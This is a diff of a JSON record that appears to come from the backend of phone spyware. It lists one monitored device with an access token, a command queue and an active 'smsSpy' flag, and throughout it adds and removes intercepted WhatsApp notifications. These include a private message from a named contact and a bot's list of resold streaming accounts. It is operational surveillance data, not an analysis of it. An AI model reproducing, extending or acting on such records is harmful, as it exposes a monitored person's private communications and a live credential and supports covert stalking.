@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776981378199,
+    "lastSeen": 1776981383702,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎63 pesan dari 41 chat",
+        "time": "24/04 05:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776981383879
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "mau main gak?",
+        "time": "24/04 05:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776981383864
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 23:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1776957681609
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Oi (14 pesan): BEW STORE",
-        "content": "To display list information use the command : .list number\nExample : .list 1\n\n*1. NETFLIX\nCAPCUT*\n2. .NETFLIX\n3. .CAPCUT PRO\n4. .VIU\n5. .YOUTUBE FAMP, INDO, &HEAD\n6. .PICSART\n7. .IQIYI\n8. .PRIME VIDEO\n9. .WIBUKU\n10. .BSTATION\n11. .VIDEO ONLY TV\n12. .SUSHIROLL\n13. .CATCHPLAY\n14. .YOUKU\n15. .CHATGPT+\n16. .ALIGHT MOTION\n17. .CANVA\n\n> ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ʙʏ ᴠɪᴏʟᴇᴛɪᴄꜱ\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
-        "time": "23/04 23:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776957681317
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎74 pesan dari 41 chat",
-        "time": "23/04 23:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776957680976
       }
     ],
     "galleryPhotos": [],
